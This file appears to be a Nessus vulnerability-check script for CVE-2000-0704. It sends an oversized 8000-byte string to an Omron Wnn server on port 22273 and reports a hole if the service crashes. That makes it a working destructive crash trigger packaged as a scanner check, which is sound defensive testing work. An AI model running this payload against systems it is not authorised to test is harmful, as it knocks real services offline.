#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
# 
#
# See the Nessus Scripts License for details
#
#
# References:
# http://www.tomo.gr.jp/users/wnn/0008ml/msg00000.html
# http://online.securityfocus.com/advisories/4413

if(description)
{
 script_id(11108);
 script_bugtraq_id(1603);
 script_version ("$Revision: 1.5 $");
 script_cve_id("CVE-2000-0704");
 name["english"] = "Omron WorldView Wnn Overflow";
 
 script_name(english:name["english"]);
	     
 desc["english"] = "
It was possible to make the remote Wnn server crash
by sending an oversized string to it.

Solution : upgrade to the latest version or contact your vendor 
for a patch
See also: http://online.securityfocus.com/advisories/4413
Risk factor : High";
		 
		 
	 	     
 script_description(english:desc["english"],
 		    francais:desc["francais"]);
		    
 
 script_summary(english:"Checks if the remote Wnn can be buffer overflown");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"Gain a shell remotely");
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2002 Renaud Deraison");
		  
 script_require_ports(22273);
 exit(0);
}

#
# The script code starts here : 
#

port = 22273;
if(!get_port_state(port))exit(0);
soc = open_sock_tcp(port);
if(soc)
{
  send(socket:soc, data:raw_string(0x00, 0x00, 0x00, 0x01));
  send(socket:soc, data:raw_string(0x00, 0x00, 0x40, 0x00));
  buf = crap(8000);
  buf[10] = raw_string(0);
  buf[799] = raw_string(0);
  send(socket:soc, data:buf);
  close(soc);
  sleep(1);
  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
}
